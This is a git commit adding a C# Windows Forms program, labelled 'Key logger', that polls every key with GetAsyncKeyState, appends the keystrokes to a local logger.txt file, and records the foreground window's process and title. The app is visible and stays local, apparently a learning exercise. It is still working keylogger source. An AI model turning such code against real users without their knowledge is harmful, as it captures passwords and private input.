482f15224b791ecf6e286a8b6a88f83dcbdd438b
TochilovDenis <denis-tochilov@yandex.ru>
2025-03-07 20:23:36 +0300

    Добавлено Windows Forms приложение для мониторинга клавиатуры и активных окон > Функционал:   * Отслеживание нажатий клавиш через GetAsyncKeyState   * Мониторинг текущего окна через GetForegroundWindow   * Запись данных в лог-файл   * Поддержка локализации

--- WindowsFormsApp_07.03.25/Form1.Designer.cs
+++ WindowsFormsApp_07.03.25/Form1.Designer.cs
@@ -29,12 +29,81 @@
         private void InitializeComponent()
         {
             this.components = new System.ComponentModel.Container();
+            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
+            this.richTextBox2 = new System.Windows.Forms.RichTextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.timer2 = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // richTextBox1
+            // 
+            this.richTextBox1.Location = new System.Drawing.Point(26, 42);
+            this.richTextBox1.Name = "richTextBox1";
+            this.richTextBox1.Size = new System.Drawing.Size(372, 385);
+            this.richTextBox1.TabIndex = 0;
+            this.richTextBox1.Text = "";
+            // 
+            // richTextBox2
+            // 
+            this.richTextBox2.Location = new System.Drawing.Point(404, 42);
+            this.richTextBox2.Name = "richTextBox2";
+            this.richTextBox2.Size = new System.Drawing.Size(384, 385);
+            this.richTextBox2.TabIndex = 1;
+            this.richTextBox2.Text = "";
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(23, 20);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(72, 16);
+            this.label1.TabIndex = 2;
+            this.label1.Text = "Key logger";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(404, 20);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(57, 16);
+            this.label2.TabIndex = 4;
+            this.label2.Text = "Process";
+            // 
+            // timer1
+            // 
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick_1);
+            // 
+            // timer2
+            // 
+            this.timer2.Interval = 1000;
+            this.timer2.Tick += new System.EventHandler(this.timer2_Tick_1);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.ClientSize = new System.Drawing.Size(800, 450);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.richTextBox2);
+            this.Controls.Add(this.richTextBox1);
+            this.Name = "Form1";
             this.Text = "Form1";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
         }
 
         #endregion
+
+        private System.Windows.Forms.RichTextBox richTextBox1;
+        private System.Windows.Forms.RichTextBox richTextBox2;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Timer timer1;
+        private System.Windows.Forms.Timer timer2;
     }
 }
 
--- WindowsFormsApp_07.03.25/Form1.cs
+++ WindowsFormsApp_07.03.25/Form1.cs
@@ -2,8 +2,12 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
+using System.Globalization;
+using System.IO;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -12,9 +16,66 @@ namespace WindowsFormsApp_07._03._25
 {
     public partial class Form1: Form
     {
+        [DllImport("user32.dll")]
+        private static extern short GetAsyncKeyState(Int32 vKey);
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll")]
+        public static extern UInt32 GetWindowThreadProcessId(IntPtr hwnd, ref Int32 pid);
+
+        public String buf = "";
+           
         public Form1()
         {
             InitializeComponent();
+            timer1.Start();
+            timer2.Start();
+
+            CultureInfo culture = CultureInfo.CurrentCulture;
+
+            string languageCode = culture.TwoLetterISOLanguageName;
+
+            string languageName = culture.DisplayName;
+
+            richTextBox2.Text += "Код языка: " + languageCode + "\n";
+            richTextBox2.Text += "Название кода: " + languageName + "\n";
         }
+
+        private void timer1_Tick_1(object sender, EventArgs e)
+        {
+            for (int key = 7; key < 256; key++)
+            {
+                int state = GetAsyncKeyState(key);
+
+                if (state != 0)
+                {
+                    //richTextBox1.Text += ((Keys)key);
+                    richTextBox1.Text += ((KeysRu)key).ToString().ToUpper();
+                    buf += ((KeysRu)key).ToString().ToUpper();
+                }
+            }
+
+            if (buf.Length > 20)
+            {
+                WriteToTxt(buf);
+                buf = "";
+            }
+
+        }
+
+        private void timer2_Tick_1(object sender, EventArgs e)
+        {
+            IntPtr h = GetForegroundWindow();
+            int pid = 0;
+            GetWindowThreadProcessId(h, ref pid);
+            Process p = Process.GetProcessById(pid);
+            richTextBox2.Text += "id {" + p.Id + "}" + " TITLE: {" + p.MainWindowTitle + "}\n";
+
+        }
+
+        private void WriteToTxt(string value) {
+            StreamWriter stream = new StreamWriter("./logger.txt", true);
+            stream.Write(value);
+            stream.Close();        }
     }
 }
